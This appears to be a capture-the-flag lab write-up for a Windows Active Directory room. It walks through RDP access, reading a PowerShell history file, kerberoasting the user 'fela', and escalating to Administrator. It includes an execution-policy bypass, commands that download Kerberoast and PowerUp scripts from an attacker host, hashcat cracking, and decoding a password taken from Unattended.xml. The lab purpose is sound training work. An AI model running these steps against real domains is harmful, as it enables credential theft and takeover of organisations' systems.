# Corp

In this room we are going to learn a bit about 4 topics:

1. Windows Forensics
2. Basics of kerberoasting
3. AV Evading
4. Applocker



## Initial Access

First things first, let us RDP into the target using xfreerdp.

```
xfreerdp /v:10.10.226.2 /u:dark /p:_QuejVudId6
```



## History File

Now that we are in let's retrieve the flag which is hidden in the ConsoleHost_history file which saves all the previous commands made by the user. This can be found in the following directory:

```
type C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Great! We got the flag!

![image-20230505102605920](./images/image-20230505102605920.png)



## Kerberoasting

Kerberoasting is a type of attack that targets Active Directory (AD) to extract the password hashes of user accounts that use Kerberos authentication. 

The basic steps to perform Kerberoasting are as follows:

1. Identify the user accounts in the Active Directory domain that use Kerberos authentication.
2. Use a tool like PowerView or BloodHound to find the Service Principal Names (SPNs) associated with those user accounts. SPNs are unique identifiers for services running on a network that use Kerberos authentication.
3. Request a Kerberos service ticket for each of the SPNs found in step 2. This can be done using the "Request-SPNTicket" command in PowerView.
4. Use a tool to extract the password hash from the service ticket. This is possible because the service ticket is encrypted using the NTLM hash of the service account's password.
5. Crack the password hash to obtain the plain text password.

### Step 1

Extract all acounts with SPNs:

```
setspn -T corp -Q */*
```

The output reveals three blocks of output:

1. Omega: Domain Controller (the machine we have access to)
2. Service account KRBTGT
3. User Account **fela**

> HTTP/fela
>
> HOST/fela@corp.local
>
> HTTP/fela@corp.local

**Question** Running that command, we find an existing SPN. What user is that for?

> fela



### Step 2

Preform the attack using the **Invoke-Kerberoast** PS Module:

```
powershell -ep bypass; (New-Object Net.WebClient).DownloadFile('https://YOUR_IP/Kerberoast.ps1', 'k.ps1')

Import-Module .\k.ps1

Invoke-Kerberoast -OutputFormat hashcat | fl
```

Copy the hash to a new file.



### Step 3

Crack the file!

```
hashcat -m 13100 -a 0 ./hash.txt /usr/share/wordlists/rockyou.txt
```

Great! Now that we know the password we can login as the new user and read the flag:

```
freerdp /v:10.10.226.2 /u:fela /p:<pass>
```



## Privilege Escalation

We will run PowerUp1.ps1 into memory for enumerating any weakness to abuse for local privilege escalation.

```
powershell -ep bypass
Invoke-WebRequest -Uri 'http://10.11.22.157:8000/PowerUp.ps1' -OutFile 'p.ps1'
Import-Module .\p.ps1
```

Let's run the function below to get all attack vectors available:

```
Invoke-AllChecks
```

One of the highlighteed attack vectors is getting the base64 admin password from the `C:\Windows\Panther\Unattend\Unattended.xml` file.

```
 type C:\Windows\Panther\Unattend\Unattended.xml
```

Extract the password, base64 decode it and login with Administrator account in the DC:

```
echo "basee64string" | base64 -d
freerdp /v:10.10.226.2 /u:Administrator /p:<pass>
```

Read the flag from the Desktop and you are done!
